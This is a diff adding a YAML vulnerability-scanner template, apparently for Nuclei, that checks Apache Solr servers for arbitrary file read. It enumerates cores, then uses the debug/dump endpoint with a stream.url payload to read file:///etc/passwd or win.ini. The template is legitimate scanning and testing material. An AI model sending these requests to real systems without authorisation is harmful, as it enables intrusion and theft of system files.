@@ -1,0 +1,65 @@
+id: apache-solr-debug-any-fileread
+info:
+  name: Apache Solr Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,solr
+
+variables:
+  data: |
+    file:///etc/passwd
+    file:///c://windows/win.ini
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: core-enumeration
+    method: GET
+    path:
+      - "{{BaseURL}}/solr/admin/cores?indexInfo=false&wt=json"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"status\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - "<"
+    extractors:
+      - type: regex
+        name: core_name
+        part: body
+        regex:
+          - '"name":"(?P<name>.*?)"'
+        internal: true
+
+  - id: file-read-attempt
+    method: POST
+    path:
+      - "{{BaseURL}}/solr/{{core_name}}/debug/dump?param=ContentStreams&wt=json"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "stream.url={{data}}"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
